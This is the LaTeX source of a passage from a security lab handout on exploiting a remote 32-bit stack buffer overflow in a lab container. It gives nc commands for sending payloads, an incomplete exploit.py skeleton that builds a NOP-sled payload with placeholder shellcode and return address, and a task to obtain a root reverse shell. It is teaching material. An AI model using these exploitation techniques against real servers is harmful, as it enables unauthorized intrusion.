\section{Task 2: Level-1 Attack} 


When we start the containers using the included 
\texttt{docker-compose.yml} file, four containers will be 
running, representing four levels of difficulties. 
We will work on Level 1 in this task. 


% -------------------------------------------
% SUBSECTION
% -------------------------------------------
\subsection{Server} 

Our first target runs on \texttt{10.9.0.5} (the port 
number is \texttt{9090}), and the vulnerable program \texttt{stack}
is a 32-bit program. 
Let's first send a benign message to this server.
We will see the following messages printed out by the target container (the
actual messages you see may be different).

\ifdefined\arm
\begin{lstlisting}
 ***
\end{lstlisting}

\else
\begin{lstlisting}
// On the VM (i.e., the attacker machine)
$ echo hello | nc 10.9.0.5 9090
Press Ctrl+C

// Messages printed out by the container
server-1-10.9.0.5 | Got a connection from 10.9.0.1
server-1-10.9.0.5 | Starting stack
server-1-10.9.0.5 | Input size: 6
server-1-10.9.0.5 | Frame Pointer (ebp) inside bof():  0xffffdb88    (*@\ding{80}@*)
server-1-10.9.0.5 | Buffer's address inside bof():     0xffffdb18    (*@\ding{80}@*)
server-1-10.9.0.5 | ==== Returned Properly ====
\end{lstlisting}
\fi


The server will accept up to \texttt{517} bytes of the data from the 
user, and that will cause a buffer overflow. Your job 
is to construct your payload to exploit this vulnerability. If 
you save your payload in a file, you can send the payload
to the server using the following command.

\begin{lstlisting}
$ cat <file> | nc 10.9.0.5 9090
\end{lstlisting}

If the server program returns, it will print out \texttt{"Returned Properly"}.
If this message is not printed out, the \texttt{stack} program has probably crashed. 
The server will still keep running, taking new connections.  

For this task, two pieces of information essential for buffer-overflow 
attacks are printed out as hints to students: 
the value of the frame pointer and the address
of the buffer (lines marked by \ding{80}). The frame point register 
called \texttt{ebp} for the x86 architecture and \texttt{rbp} for the x64 architecture.
You can use these two pieces of information to construct 
your payload. 


\paragraph{Added randomness.} We have added a little bit of randomness
in the program, so different students are likely to see different values
for the buffer address and frame pointer. The values only change 
when the container restarts, so as long as you keep the 
container running, you will see the same numbers (the numbers 
seen by different students are still different). This randomness
is different from the address-randomization countermeasure. Its sole
purpose is to make students' work a little bit different.

\subsection{Writing Exploit Code and Launching Attack} 

To exploit the buffer-overflow vulnerability in the target program,
we need to prepare a payload, and save it inside a file (we will use 
\texttt{badfile} as the file name in this document). 
We will use a Python program to do that.
We provide a skeleton program called \texttt{exploit.py}, which
is included in the lab setup file. 
The code is incomplete, and students need to replace some of the essential 
values in the code. 


\newcommand{\needtochange}{\ding{73} Need to change \ding{73}}


\begin{lstlisting}[language=python, caption={The skeleton exploit code (\texttt{exploit.py})}]
#!/usr/bin/python3
import sys

# You can copy and paste the shellcode from Task 1
shellcode = (
  ""                     # (*@\needtochange@*)
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload
start =  0               # (*@\needtochange@*)
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and save it somewhere in the payload
ret    = 0xAABBCCDD      # (*@\needtochange@*)
offset = 0               # (*@\needtochange@*)

# Use 4 for 32-bit address 
# Use 8 for 64-bit address
content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
\end{lstlisting}


After you finish the above program, run it. This will generate
the contents for \texttt{badfile}. Then feed it to
the vulnerable server. If your exploit is implemented correctly, the 
command you put inside your shellcode will be executed. If your 
command generates some outputs, you should be able to see
them from the container window. Please provide proofs to show that you
can successfully get the vulnerable server to run 
your commands.

\begin{lstlisting}
$./exploit.py   // create the badfile
$ cat badfile | nc 10.9.0.5 9090
\end{lstlisting}
 

\paragraph{Reverse shell.}
We are not interested in running some pre-determined commands. We 
want to get a root shell on the target server, so we can 
type any command we want. Since we are on a remote machine,
if we simply get the server to run \texttt{/bin/sh}, we won't be able to
control the shell program. Reverse shell is a typical
technique to solve this problem. Section~\ref{sec:guildelines} provides 
detailed instructions on how to run a reverse shell.
Please modify the command string in your shellcode, so you can
get a reverse shell on the target server. 
Please include screenshots and explanation in your lab report.
